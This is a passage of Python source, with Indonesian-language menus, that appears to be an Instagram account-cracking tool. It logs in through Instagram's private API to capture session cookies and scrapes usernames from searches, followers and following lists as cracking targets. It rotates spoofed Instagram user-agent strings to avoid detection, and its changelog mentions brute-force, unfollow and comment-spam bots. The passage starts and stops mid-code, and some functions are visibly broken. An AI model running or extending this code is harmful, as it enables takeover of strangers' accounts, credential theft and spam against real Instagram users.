			self.generateUUID(False),
			urllib.request.quote(self.data))
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.mentod()
			urut=[]
			urut.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{self.username}\n{P2}Pengikut  : {H2}{followers}\n{P2}Mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} {P2}Data {H2}• {K2}• {M2}•",width=80,padding=(0,3),style=f"{color_table}"))
			prints(Panel(f"{P2}\t     Selamat Datang {H2}{nama}{P2} Selamat Menikmati Crcak ",width=80,style=f"{color_table}"))
			prints(Panel(f"""[white][[blue]01[white]]. Crack Dari Pencari Nama        [white][[blue]04[white]]. Crack Ulang Hasil [white]CP
[white][[blue]02[white]]. Crack Dari Pengikut            [white][[blue]05[white]]. Lihat Hasil Crack
[white][[blue]03[white]]. Crack Dari Mengikuti           [white][[red]E[white]]. [red]LogOut """,title=f"[{P2} Pilihan Menu {hapus}]",width=80,padding=(0,4),style=f"{color_table}"))
	def BUG(self):
		jalan(f"㋛ Tunggu Sedang Proses Menuju WhatsApp Admin");time.sleep(5);os.system("xdg-open https://wa.me/+6289653030972?");time.sleep(5);exit()
	
	def mentod(self):
		for i in external:
			nama = i.split('|')[0]
			followers = i.split('|')[1]
			following = i.split('|')[2]
		try:
			ses=requests.Session()
			lisen=open('.lisen.txt','r').read().splitlines()
			met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisen).json()
			men = met['licenseKey']
			key = men['key'][0:16]
			tahun = men['expires'][0:4]
			buln = men['expires'][5:7]
			tanggal=men['expires'][8:10]
			bulan = bulan_ttl[buln]
			tahun1 = men['created'][0:4]
			buln1 = men['created'][5:7]
			tanggal1 = men['created'][8:10]
			bulan1=bulan_ttl[buln1]
			#urut.append(Panel(f"{P2}Pengikut : {followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			#self.tol.print(Columns(urut))
		except:
			key = ""
			tanggal = ""
			bulan = ""
			tahun = ""
			tanggal1= ""
			bulan1 = ""
			tahun1 = ""
			urut=[]
			urut.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{self.username}\n{P2}Pengikut  : {H2}{followers}\n{P2}Mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} {P2}Pengguna {H2}• {K2}• {M2}•",width=80,padding=(0,3),style=f"{color_table}"))
			#urut.append(Panel(f"{P2}Pengikut : {P2}{followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			self.tol.print(Columns(urut))
	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))
		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))
		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()
	def Exit(self):
		prints(Panel(f"[white]Apakah anda yakin ingin keluar ?",width=50,padding=(0,4),style=f"{color_table}"))
		x=input(f'{N}• Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan(f'• Berhasil Keluar Silakan Ketik Ulang Perintah Scriptnya');time.sleep(2);exit()
		elif x in ('t','T'):
			jalan(f'• Kembali Ke Menu Utama Tubg');time.sleep(5);self.menu()
		else:
			self.menu()
	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={six_id}&rrank_token=0.35875757839675004&include_reel=true"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid
	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=uuid.uuid4()
		guid=uuid.uuid4().hex[:32]
		xx=self.s.get(f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={guid}').cookies['csrftoken']
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': xx})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			str(uuid.uuid4()),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write(f"\r{H}•{N} Sedang Mengumpulkan {H}{len(internal)} {N}Useraname Search {H}{nama}{N}")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}[!] Koneksi internet bermasala;h{C}')
		except (KeyError, UnboundLocalError):
				exit(f"{N}[{M}!{N}] gagal mengambil username, kemungkinan username tidaklah publik")
		except KeyboardInterrupt:
				pass
		return internal
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[!] Cookie checkpoint{N}")
			except Exception as e:
				exit(f"{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:register_device()
	def infoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r•{N} Sedang mengumpulkan {O}{len(internal)} {N}useraname dari {O}{user}{N}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
	def ifoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r•{N} Sedang mengumpulkan {O}{len(internal)} {N}useraname dari {O}{user}{N}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasala;h{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
		
	def ua_sam(self):
		rr=random.randint
		rc=random.choice
		samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
		real,me = random.choice(samsung).split('|')
		com=rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10","24/7.0","21/5.0",'26/8.0.0'])
		versi=rc(igve)
		ua1=f"Instagram {versi} Android (30/11; 360dpi; {pxl}; motorola; moto g(9) play; guamp; qcom; pt_BR; 566040970)"
		ua2="Instagram {versi} Android (29/10; 280dpi; 720x1381; motorola; motorola one macro; lima; mt6771; pt_BR; 566040970)"
		ua4=f"Instagram {versi} Android (33/13; 440dpi; {pxl}; Xiaomi; 21081111RG; amber; mt6893; it_IT; 566040806)"
		ua3=f"Instagram {versi} (iPhone15,2; iOS 16_0_3; en_US; en; scale=3.00; 1179x2556; 548339486)"
		ua5=f"Instagram {versi} Android (30/11; 440dpi; {pxl}; Xiaomi/Redmi; M2004J19C; lancelot; mt6768; pt_BR; 566040621)"
		ua6=f"Instagram 318.0.7.22.109 (iPhone12,1; iOS 16_6_1; pt_BR; pt; scale=2.00; 750x1624; 565151867)"
		akusayang = random.choice([ua1,ua2,ua4,ua3,ua5,ua6])
		return akusayang
		
	def ua_igeh(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpis=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		ua1=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; ZTE; mooncake; ZTE-LINK; {com}; {com}; 5634549874)"
		ua2=f"Instagram {versi} Android (31/12; 190dpi; {pxl}; ZTE; mooncake; ZTE-LINK; qcom; ru_RU; 323503577)"
		ua3=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Google/google; Pixel 7; {com}; {com}; en_US; 563459864)"
		ua4=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; DOOGEE; S61Pro; M19H; mt6765; {com}; 566040970)"
		ua5=f"Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; {pxl}"
		akus=random.choice(["","Carbon","Meta","Lite","Basic"])
		ua = f"Instagram{akus} {versi} Android ({andro}; {dpis}dpi; {pxl}; realme; {real}; RIDWAN-XD; {com}; {comi})"
		ngewe = random.choice([ua,ua1,ua2,ua3,ua4,ua5])
	#	ua2= f"Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{str(rr(4,13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi})"
		return ua

	def ua_v2(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me=rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,3